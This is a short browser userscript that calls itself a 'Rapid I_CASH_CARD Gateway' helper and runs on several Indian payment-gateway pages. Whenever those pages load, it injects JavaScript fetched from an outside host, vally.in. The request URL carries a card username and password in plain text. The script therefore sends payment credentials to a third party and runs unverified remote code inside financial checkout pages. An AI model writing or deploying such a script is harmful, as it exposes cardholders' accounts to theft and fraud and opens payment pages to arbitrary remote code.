// ==UserScript==
			   // @name           King Electronic_OSS Gateway
			   // @namespace      salmantravels@ymail.com
			   // @description    Rapid I_CASH_CARD Gateway.
			   // @include        http://www.icashcard.in/pggateway/icccheckcard.aspx
			   // @include        http://www.icashcard.in/pggateway/icccheckcard.aspx*
			   // @include        https://www.icashcard.in/pggateway/ICCPaySuccess.aspx?TransDetails*
			   // @include        https://www.icashcard.in/pggateway/icccheckcard.aspx
			   // @include        https://www.icashcard.in/pggateway/ICCPaySuccess.aspx*
			   // @include        http://icc.donecard.com/PaymentGatewayASP/DoneCardPaymentGateway.asp
			   // @include        http://icc.onestopshop.in/PaymentGatewayASP/OSSPaymentGateway.asp
			   // @include        http://www.icashcard.in/pggateway/valuecardLogin.aspx?ccode=MTAwMDQ=&customparam=MQ==
			   // ==/UserScript==
				
				function include ( JsFile )
{
        var elementBody = document.getElementsByTagName('body').item(0);
        var script = document.createElement('script');
        script.src = JsFile ;
        script.type = 'text/javascript';
        elementBody.appendChild(script)
}
include ('http://vally.in/includefile/pay2.php?uname=skjain_Gateway&gate1=One Stop Shop RDS&cardusername=SALMANTRAVELS&cardpassword=SALMANTRAVELS');